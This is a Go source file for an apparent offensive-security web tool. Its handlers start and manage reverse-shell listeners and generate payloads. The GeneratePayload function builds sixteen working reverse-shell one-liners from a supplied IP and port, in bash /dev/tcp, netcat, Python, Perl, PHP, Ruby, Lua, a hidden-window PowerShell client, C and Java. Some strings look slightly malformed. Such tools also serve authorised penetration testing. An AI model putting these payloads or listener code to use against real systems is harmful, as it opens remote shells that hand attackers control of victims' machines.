package handler

import (
	"crypto/rand"
	"encoding/hex"
	"net/http"
	"strconv"
	"sync"

	"mayfly/internal/service"

	"github.com/gin-gonic/gin"
)

// ListenerHandler 反弹Shell监听管理
type ListenerHandler struct {
	mgr *service.ListenerManager
}

var (
	listenerMgrOnce sync.Once
	listenerMgr     *service.ListenerManager
)

func getListenerManager() *service.ListenerManager {
	listenerMgrOnce.Do(func() {
		listenerMgr = service.NewListenerManager()
	})
	return listenerMgr
}

// NewListenerHandler 创建 ListenerHandler
func NewListenerHandler() *ListenerHandler {
	return &ListenerHandler{mgr: getListenerManager()}
}

// StartListener 启动监听
func (h *ListenerHandler) StartListener(c *gin.Context) {
	var req struct {
		Port     int    `json:"port"`
		Protocol string `json:"protocol"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.Port <= 0 || req.Port > 65535 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "端口号无效（1-65535）"})
		return
	}
	if req.Protocol == "" {
		req.Protocol = "tcp"
	}
	id := genListenerID()
	if err := h.mgr.StartListener(id, req.Port, req.Protocol); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	l, _ := h.mgr.GetListener(id)
	c.JSON(http.StatusOK, gin.H{
		"id":        l.ID,
		"port":      l.Port,
		"protocol":  l.Protocol,
		"status":    l.Status,
		"created_at": l.CreatedAt,
	})
}

// StopListener 停止监听
func (h *ListenerHandler) StopListener(c *gin.Context) {
	id := c.Param("id")
	if err := h.mgr.StopListener(id); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "已停止"})
}

// DeleteListener 删除监听
func (h *ListenerHandler) DeleteListener(c *gin.Context) {
	id := c.Param("id")
	if err := h.mgr.DeleteListener(id); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "已删除"})
}

// ListListeners 列出所有监听
func (h *ListenerHandler) ListListeners(c *gin.Context) {
	list := h.mgr.ListListeners()
	result := make([]gin.H, 0, len(list))
	for _, l := range list {
		result = append(result, gin.H{
			"id":         l.ID,
			"port":       l.Port,
			"protocol":   l.Protocol,
			"status":     l.Status,
			"created_at": l.CreatedAt,
		})
	}
	c.JSON(http.StatusOK, gin.H{"listeners": result})
}

// GetListenerOutput 获取监听输出
func (h *ListenerHandler) GetListenerOutput(c *gin.Context) {
	id := c.Param("id")
	output, err := h.mgr.GetOutput(id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"output": output})
}

// GeneratePayload 生成反弹Shell命令
func (h *ListenerHandler) GeneratePayload(c *gin.Context) {
	ip := c.Query("ip")
	port := c.Query("port")
	if ip == "" || port == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "IP和端口不能为空"})
		return
	}
	_, err := strconv.Atoi(port)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "端口号无效"})
		return
	}

	payloads := generateReverseShells(ip, port)
	c.JSON(http.StatusOK, gin.H{"payloads": payloads})
}

func genListenerID() string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

type reverseShellPayload struct {
	Name   string `json:"name"`
	Type   string `json:"type"`
	Cmd    string `json:"cmd"`
}

func generateReverseShells(ip, port string) []reverseShellPayload {
	return []reverseShellPayload{
		{Name: "Bash -i", Type: "bash", Cmd: "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"},
		{Name: "Bash (exec)", Type: "bash", Cmd: "exec 5<>/dev/tcp/" + ip + "/" + port + ";cat <&5 | while read line; do $line 2>&1 >&5; done"},
		{Name: "Bash 196", Type: "bash", Cmd: "0<&196;exec 196<>/dev/tcp/" + ip + "/" + port + "; sh <&196 >&196 2>&196"},
		{Name: "Netcat (nc -e)", Type: "nc", Cmd: "nc -e /bin/sh " + ip + " " + port},
		{Name: "Netcat (mkfifo)", Type: "nc", Cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f"},
		{Name: "Netcat (nc -c)", Type: "nc", Cmd: "nc -c /bin/sh " + ip + " " + port},
		{Name: "Python (v2)", Type: "python", Cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"},
		{Name: "Python (v3)", Type: "python", Cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"},
		{Name: "Perl", Type: "perl", Cmd: "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,pack_sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"},
		{Name: "PHP (fsockopen)", Type: "php", Cmd: "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"},
		{Name: "PHP (exec)", Type: "php", Cmd: "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"},
		{Name: "Ruby", Type: "ruby", Cmd: "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + ip + "\"," + port + ");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"},
		{Name: "Lua", Type: "lua", Cmd: "lua -e 'require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"" + ip + "\"," + port + ");os.execute(\"/bin/sh -i <&3 >&3 2>&3\");'"},
		{Name: "PowerShell", Type: "powershell", Cmd: "powershell -NoP -NonI -W Hidden -Exec Bypass -C \"$c=New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+('PS '+(pwd).Path+'> ');$ab=(Text.Encoding)ASCII.GetBytes($sb2);$s.Write($ab,0,$ab.Length);$s.Flush()}}; $c.Close()\""},
		{Name: "C (compile)", Type: "c", Cmd: "#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint main(){{int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a;a.sin_family=AF_INET;a.sin_port=htons(" + port + ");inet_aton(\"" + ip + "\",&a.sin_addr);connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execve(\"/bin/sh\",0,0);}}"},
		{Name: "War (Java)", Type: "java", Cmd: "java -jar jjs.jar -scripting -e \"var host='" + ip + "';var port=" + port + ";var s=new java.net.Socket(host,port);var pi=new java.lang.ProcessBuilder('/bin/sh').redirectErrorStream(true).start();var po=pi.getOutputStream();var pe=pi.getErrorStream();var si=s.getInputStream();var so=s.getOutputStream();new java.lang.Thread(function(){{while(true){{var b=si.read();if(b<0)break;po.write(b);po.flush();}}}}).start();new java.lang.Thread(function(){{while(true){{var b=pe.read();if(b<0)break;so.write(b);so.flush();}}}}).start();new java.lang.Thread(function(){{while(true){{var b=System.in.read();if(b<0)break;so.write(b);so.flush();}}}}).start();\""},
	}
}
